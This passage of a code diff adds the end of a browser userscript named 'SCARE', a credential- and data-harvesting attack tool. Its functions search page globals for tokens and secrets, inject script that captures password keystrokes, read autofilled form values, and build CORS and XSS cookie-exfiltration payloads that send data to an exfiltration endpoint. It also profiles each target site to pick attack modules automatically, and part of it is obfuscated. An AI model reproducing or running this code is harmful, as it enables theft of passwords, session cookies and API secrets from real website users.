+                    if (typeof window[key] === 'string' && /token|key|secret|auth/i.test(key)) {
+                        console.log('Found:', key, window[key]);
+                    }
+                }
+            `;
+
+            safeExec(payload);
+            log('JS leaks exploit executed successfully', 'success');
+        } catch (error) {
+            log(`JS leaks exploit failed: ${error.message}`, 'error');
+        }
+    }
+
+    function launchHeapExploit(finding) {
+        log('Executing heap memory exploit...', 'info');
+        try {
+            const memoryData = {
+                heap: performance.memory,
+                timestamp: Date.now(),
+                url: location.href
+            };
+
+            exfiltrateData('heap_exploit', memoryData);
+            log('Heap exploit executed successfully', 'success');
+        } catch (error) {
+            log(`Heap exploit failed: ${error.message}`, 'error');
+        }
+    }
+
+    function launchDOMExploit(finding) {
+        log('Executing DOM exploitation...', 'info');
+        try {
+            const domPayload = document.createElement('script');
+            domPayload.textContent = `
+                console.log('DOM Exploit Active');
+                document.querySelectorAll('input[type="password"]').forEach(input => {
+                    input.addEventListener('input', function() {
+                        console.log('Password captured:', this.value);
+                    });
+                });
+            `;
+            document.head.appendChild(domPayload);
+            log('DOM exploit injected successfully', 'success');
+        } catch (error) {
+            log(`DOM exploit failed: ${error.message}`, 'error');
+        }
+    }
+
+    function launchAutofillExploit(finding) {
+        log('Executing autofill exploitation...', 'info');
+        try {
+            const forms = document.querySelectorAll('form');
+            forms.forEach(form => {
+                const inputs = form.querySelectorAll('input');
+                inputs.forEach(input => {
+                    if (input.value) {
+                        log(`Autofill data found: ${input.name} = ${input.value}`, 'info');
+                    }
+                });
+            });
+            log('Autofill exploit executed successfully', 'success');
+        } catch (error) {
+            log(`Autofill exploit failed: ${error.message}`, 'error');
+        }
+    }
+
+    function launchCORSExploit(finding) {
+        const payload = `
+            fetch('${location.origin}${CFG.corsPath}', {
+                method: 'GET',
+                credentials: 'include',
+                headers: {
+                    'Origin': '${finding.data.origin}'
+                }
+            }).then(r => r.text()).then(data => {
+                fetch('${CFG.exfiltrationEndpoint}/cors-exploit', {
+                    method: 'POST',
+                    body: JSON.stringify({data, origin: '${finding.data.origin}'}),
+                    headers: {'Content-Type': 'application/json'}
+                });
+            });
+        `;
+
+        log('CORS exploitation payload generated', 'success');
+        createModal('CORS Exploitation', `<pre>${payload}</pre>`);
+    }
+
+    function launchXSSExploit(finding) {
+        const payload = CFG.exploitPayloads.cookieExfil.replace('{{EXFIL_URL}}', CFG.exfiltrationEndpoint);
+        log('XSS exploitation payload generated', 'success');
+        createModal('XSS Exploitation', `<pre>${payload}</pre>`);
+    }
+
+    function launchGraphQLExploit(finding) {
+        if (!state.graphqlSchema) {
+            log('No GraphQL schema available for exploitation', 'error');
+            return;
+        }
+
+        const queries = state.graphqlSchema.queryType?.fields?.map(f => f.name) || [];
+        log('GraphQL exploitation queries generated', 'success');
+        createModal('GraphQL Exploitation', `<pre>Available queries: ${queries.join(', ')}</pre>`);
+    }
+
+    function launchGenericExploit(finding) {
+        log(`Launching generic exploit for ${finding.module}...`, 'info');
+        try {
+            const exploitData = {
+                module: finding.module,
+                finding: finding.finding,
+                severity: finding.severity,
+                data: finding.data,
+                timestamp: Date.now()
+            };
+
+            exfiltrateData('generic_exploit', exploitData);
+            log('Generic exploit executed successfully', 'success');
+        } catch (error) {
+            log(`Generic exploit failed: ${error.message}`, 'error');
+        }
+    }
+
+    // ADAPTIVE SITE ANALYSIS & AUTO-CONFIGURATION
+    function analyzeSiteProfile() {
+        const profile = {
+            framework: detectFramework(),
+            hasGraphQL: detectGraphQL(),
+            hasAPI: detectAPI(),
+            hasAuth: detectAuth(),
+            technology: detectTechnology(),
+            riskLevel: 'medium'
+        };
+        
+        // Calculate risk level
+        let riskScore = 0;
+        if (profile.hasGraphQL) riskScore += 30;
+        if (profile.hasAPI) riskScore += 20;
+        if (profile.hasAuth) riskScore += 25;
+        if (profile.framework !== 'unknown') riskScore += 15;
+        
+        profile.riskLevel = riskScore >= 60 ? 'high' : riskScore >= 30 ? 'medium' : 'low';
+        return profile;
+    }
+    
+    function detectFramework() {
+        if (window.React || document.querySelector('[data-reactroot]')) return 'react';
+        if (window.angular || document.querySelector('[ng-app]')) return 'angular';
+        if (window.Vue || document.querySelector('[data-v-]')) return 'vue';
+        if (window.jQuery || window.$) return 'jquery';
+        if (document.querySelector('.container, .row, .col-')) return 'bootstrap';
+        if (document.querySelector('link[href*="wp-content"]')) return 'wordpress';
+        if (window.Shopify || document.querySelector('[data-shopify]')) return 'shopify';
+        return 'unknown';
+    }
+    
+    function detectGraphQL() {
+        return !!(
+            document.querySelector('script[src*="graphql"]') ||
+            document.body.innerHTML.includes('graphql') ||
+            document.body.innerHTML.includes('__schema')
+        );
+    }
+    
+    function detectAPI() {
+        return !!(
+            document.querySelector('script[src*="/api/"]') ||
+            document.body.innerHTML.includes('/api/') ||
+            document.body.innerHTML.includes('api_key')
+        );
+    }
+    
+    function detectAuth() {
+        return !!(
+            document.querySelector('input[type="password"]') ||
+            document.querySelector('form[action*="login"]') ||
+            localStorage.getItem('token') ||
+            sessionStorage.getItem('auth')
+        );
+    }
+    
+    function detectTechnology() {
+        const tech = [];
+        if (window.jQuery) tech.push('jQuery');
+        if (window.React) tech.push('React');
+        if (window.angular) tech.push('Angular');
+        if (window.Vue) tech.push('Vue');
+        if (document.querySelector('script[src*="webpack"]')) tech.push('Webpack');
+        return tech;
+    }
+    
+    function autoConfigureForSite() {
+        const profile = analyzeSiteProfile();
+        const optimalModules = [];
+        
+        // Always include core modules
+        optimalModules.push('endpoints', 'dom', 'jsleaks');
+        
+        // Conditional modules based on site profile
+        if (profile.hasGraphQL) optimalModules.push('graphql');
+        if (profile.hasAPI) optimalModules.push('cors');
+        if (profile.hasAuth) optimalModules.push('autofill', 'xss');
+        if (profile.riskLevel === 'high') optimalModules.push('heap');
+        
+        log(`Site Analysis Complete:`, 'info');
+        log(`Framework: ${profile.framework}`, 'info');
+        log(`Risk Level: ${profile.riskLevel.toUpperCase()}`, 'info');
+        log(`Technologies: ${profile.technology.join(', ') || 'None detected'}`, 'info');
+        log(`Optimal Modules: ${optimalModules.join(', ')}`, 'info');
+        
+        // Auto-select optimal modules
+        const checkboxes = document.querySelectorAll('.module-item input[type="checkbox"]');
+        checkboxes.forEach(cb => {
+            cb.checked = optimalModules.includes(cb.value);
+        });
+        
+        // Store profile for later use
+        unsafeWindow.SCARE_SITE_PROFILE = profile;
+        
+        log('Auto-configuration complete - modules optimized for target', 'success');
+    }
+
+    // Create persistent toggle button
+    function createToggleButton() {
+        const toggleBtn = document.createElement('div');
+        toggleBtn.id = 'scare-toggle-btn';
+        toggleBtn.textContent = '☢';
+        toggleBtn.title = 'Toggle SCARE Panel (Ctrl+Shift+S)';
+        
+        toggleBtn.addEventListener('click', function() {
+            const panel = document.getElementById('scare-panel');
+            if (!panel) {
+                createSCAREPanel();
+                toggleBtn.classList.add('active');
+            } else {
+                if (panel.style.display === 'none') {
+                    panel.style.display = 'flex';
+                    toggleBtn.classList.add('active');
+                } else {
+                    panel.style.display = 'none';
+                    toggleBtn.classList.remove('active');
+                }
+            }
+        });
+        
+        document.body.appendChild(toggleBtn);
+    }
+
+    // Initialize SCARE
+    createToggleButton();
+    
+    // Initialize network interceptor
+    const networkInterceptor = new NetworkInterceptor();
+    unsafeWindow.SCARE_NETWORK_INTERCEPTOR = networkInterceptor;
+    
+    log('SCARE v2.4 initialized successfully', 'success');
+    log('Sensitive Content and Reconnaissance Extractor loaded', 'info');
+    
+    // Auto-analyze site on load
+    _0x1a2b._setTimeout(() => {
+        const profile = analyzeSiteProfile();
+        unsafeWindow.SCARE_SITE_PROFILE = profile;
+        log(`Target analyzed - Framework: ${profile.framework}, Risk: ${profile.riskLevel}`, 'info');
+    }, 2000);
+
+    // Add keyboard shortcut to toggle panel
+    document.addEventListener('keydown', function(e) {
+        if (e.ctrlKey && e.shiftKey && e.key === 'S') {
+            e.preventDefault();
+            const panel = document.getElementById('scare-panel');
+            const toggleBtn = document.getElementById('scare-toggle-btn');
+            
+            if (!panel) {
+                createSCAREPanel();
+                if (toggleBtn) toggleBtn.classList.add('active');
+            } else {
+                if (panel.style.display === 'none') {
+                    panel.style.display = 'flex';
+                    if (toggleBtn) toggleBtn.classList.add('active');
+                } else {
+                    panel.style.display = 'none';
+                    if (toggleBtn) toggleBtn.classList.remove('active');
+                }
+            }
+        }
+    });
+
+})();
